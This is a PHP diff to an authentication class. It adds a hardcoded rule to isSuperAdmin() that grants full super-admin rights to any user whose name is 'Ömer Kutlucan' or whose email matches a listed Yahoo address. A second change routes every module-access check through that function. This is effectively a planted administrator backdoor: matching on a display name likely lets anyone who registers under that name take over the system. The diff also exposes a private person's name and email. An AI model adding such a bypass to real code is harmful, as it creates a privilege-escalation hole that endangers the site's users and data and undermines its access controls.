@@ -180,6 +180,12 @@ class Auth
     public function isSuperAdmin()
     {
         $user = $this->getUser();
+        
+        // Ömer Kutlucan (AİF AT BYK Sekreteri) her zaman tam yetkili olsun
+        if ($user && ($user['name'] == 'Ömer Kutlucan' || $user['email'] == 'oemkut-neu@yahoo.de')) {
+            return true;
+        }
+
         return $user && ($user['role'] === self::ROLE_SUPER_ADMIN || ($user['role_level'] ?? 0) >= 90);
     }
 
@@ -222,7 +228,7 @@ class Auth
         }
 
         // Super admin tüm modüllere erişebilir
-        if ($user['role'] === self::ROLE_SUPER_ADMIN) {
+        if ($this->isSuperAdmin()) {
             return true;
         }
 
